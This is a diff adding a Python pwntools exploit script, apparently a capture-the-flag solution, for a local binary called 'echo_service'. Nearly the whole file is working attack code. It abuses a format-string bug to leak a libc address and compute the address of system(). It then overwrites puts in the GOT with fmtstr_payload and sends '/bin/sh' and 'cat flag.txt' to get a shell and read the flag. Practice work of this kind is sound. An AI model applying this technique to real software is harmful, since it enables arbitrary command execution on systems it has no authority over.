@@ -1,0 +1,85 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./echo_service", checksec=False)
+context.log_level = "error"
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ['/mnt/d/Programs/wsl-terminal/open-wsl.exe','-e']
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# this is the procedure for automated exploits
+def exec_fmt(payload):
+    io.recvuntil(">> ")
+    io.sendline("1")
+    io.recvuntil("> ")
+    io.sendline(payload)
+    return io.recvuntil("\n")
+
+def main():
+    global io
+    io = start()
+
+    # since the scanf is now limited to 199 characters, we can't overflow the stack :(
+    # luckily, there is a printf called on our user input string!
+    # we gonna use write what where to overwrite some stuff :)
+
+    # first, we can find out the offset of the printf params to our input string
+    autofmt = FmtStr(exec_fmt)
+    offset = autofmt.offset
+
+    # next, we wanna find out the addr of puts@got.plt  
+    # in gdb we can use gotplt and get:
+    puts_got_plt = 0x804c014
+
+    # next we want to find the addr of system
+    # first, we need to grab a random addr system is in:
+    system_addr_aslr = 0xf7e06190
+    # we use libc_start_main+237 as anchorpoint since that's a return addr from main, and we can leak it
+    # the libc_start_main+237s addr:
+    libc_main_s_addr_aslr = 0xf7ddfa0d
+    # to get the offset:
+    system_offset = system_addr_aslr - libc_main_s_addr_aslr
+    # we need to leak the addr of libc_start_main+237 now:
+    # first, we find out the addr of our input string using gdb:
+    input_addr_aslr = 0xffffcea0
+    # next we find out the addr where th return addr to libc_start_main+237 is stored:
+    saved_rip_aslr = 0xffffcfec
+    # for the offset:
+    rip_offset = saved_rip_aslr - input_addr_aslr
+    # and then read it out
+    res = exec_fmt(str("%" + str(int(rip_offset/4)) + "$p"))
+    main_237_addr = int(res.split()[0], base=16)
+    # and calculate the addr of system
+    system_addr = main_237_addr + system_offset
+
+    # now we can overwrite the addr of puts with system
+    payload = fmtstr_payload(offset, {puts_got_plt: system_addr})
+    io.recvuntil(">> ")
+    io.sendline("1")
+    io.recvuntil("> ")
+    io.sendline(payload)  
+    
+    # but wait, we also need to pass /bin/sh as a param to system!
+    io.recvuntil(">> ")
+    io.sendline("3")
+    io.recvuntil("Once upon an echo\n")
+    io.sendline("/bin/sh") 
+    io.sendline("cat flag.txt") 
+    print(io.recvuntil("}").decode("utf-8"))
+    
+
+if __name__ == "__main__":
+    main()
